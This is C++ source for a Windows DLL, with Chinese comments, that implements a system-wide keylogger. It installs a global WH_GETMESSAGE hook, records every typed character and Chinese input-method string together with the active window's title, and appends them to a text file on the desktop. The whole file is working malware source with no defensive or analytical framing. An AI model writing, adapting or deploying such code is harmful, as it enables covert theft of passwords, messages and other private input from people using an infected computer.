
#include <windows.h>
#include <imm.h>
#include <stdio.h>
#include <iostream>

using namespace std;

//#define HOOK_API __declspec(dllexport)

HHOOK        g_hHook            = NULL;        //hook句柄
HINSTANCE  g_hHinstance    = NULL;        //程序句柄
HWND         LastFocusWnd  = 0;//上一次句柄,必须使全局的
HWND         FocusWnd;         //当前窗口句柄，必须使全局的
DWORD       GCS[2] = {GCS_COMPSTR, GCS_RESULTSTR};

char title[256];              //获得窗口名字
char *ftemp;                //begin/end 写到文件里面
char temptitle[256]="<<标题：";  //<<标题：窗口名字>>
char t[2]={0,0};              //捕获单个字母
void writefile(char *lpstr)
{//保存为文件
	FILE* f1;
	char cmd[256] = "C:\\Users\\...\\Desktop\\hook.txt";
    f1=fopen(cmd,"a+");
    fwrite(lpstr,strlen(lpstr),1,f1);
    fclose(f1);
}

void writtitle()
{//保存当前窗口
	FocusWnd = GetActiveWindow();

	if(LastFocusWnd != FocusWnd){

		ftemp="\n---------End----------\n\n--------begin---------\n";
		writefile(ftemp);
		GetWindowText(FocusWnd, title, 256);  //当前窗口标题
		LastFocusWnd = FocusWnd;
		strcat(temptitle,title);
		strcat(temptitle,">>\n");
		writefile(temptitle);
	}
}
LRESULT CALLBACK MessageProc(int nCode,WPARAM wParam,LPARAM lParam)
{
    PMSG pmsg = (PMSG)lParam;
    if (nCode == HC_ACTION)
    {
        switch (pmsg->message)
        {
        // case 15: ?
        case 642:case 257:case WM_IME_COMPOSITION:
            {
                HIMC hIMC;
                HWND hWnd=pmsg->hwnd;
                DWORD dwSize;
                char lpstr[20];
                for (int i=0; i<2; i++) {
                    if(pmsg->lParam & GCS[i])
                    {
                        memset(lpstr, 0, 20);

                        //先获取当前正在输入的窗口的输入法句柄
                        hIMC = ImmGetContext(hWnd);
                        // 先将ImmGetCompositionString的获取长度设为0来获取字符串大小.
                        dwSize = ImmGetCompositionString(hIMC, GCS[i], lpstr, 0);

                        writefile(lpstr);

                        // 缓冲区大小要加上字符串的NULL结束符大小,
                        //   考虑到UNICODE
                        dwSize += sizeof(WCHAR);

                        memset(lpstr, 0, 20);

                        // 再调用一次.ImmGetCompositionString获取字符串
                        ImmGetCompositionString(hIMC, GCS[i], lpstr, dwSize);
                        //现在lpstr里面即是输入的汉字了。
                        writtitle();                //保存当前窗口
                        writefile(lpstr);           //保存为文件
                        ImmReleaseContext(hWnd, hIMC);
                    }
                }
            }
            break;
        case WM_CHAR:  //截获发向焦点窗口的键盘消息
            {
			    char ch,str[10];
			    ch=(char)(pmsg->wParam);
			    if (ch>=32 && ch<=126)           //可见字符
				{
					writtitle();
					t[0]=ch;
					writefile(t);
				}
				if (ch>=8 && ch<=31)			 //控制字符
				{
					switch(ch)
					{
					    case 8:
							strcpy(str,"[退格]");
							break;
					    case 9:
							strcpy(str,"[TAB]");
							break;
					    case 13:
							strcpy(str,"[Enter]");
							break;
						default:strcpy(str,"n");
					}
					if (strcmp(str,"n"))
					{
						writtitle();
				    	writefile(str);
					}
				}

			}
            break;
        }
    }
	LRESULT lResult = CallNextHookEx(g_hHook, nCode, wParam, lParam);

    return(lResult);
}

//HOOK_API BOOL InstallHook()
extern "C" __declspec(dllexport) BOOL InstallHook()
{
    // WH_CALLWNDPROC
    g_hHook = SetWindowsHookEx(WH_GETMESSAGE,(HOOKPROC)MessageProc,g_hHinstance,0);
    if (g_hHook == NULL) {
        return FALSE;
    }
    return TRUE;
}

//HOOK_API BOOL UnHook()
extern "C" __declspec(dllexport) BOOL UnHook()
{
    return UnhookWindowsHookEx(g_hHook);
}


extern "C" __declspec(dllexport) BOOL APIENTRY DllMain(
                       HANDLE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    printf("=============\n");
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        g_hHinstance=HINSTANCE(hModule);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        UnHook();
        break;
    }
    return TRUE;
}
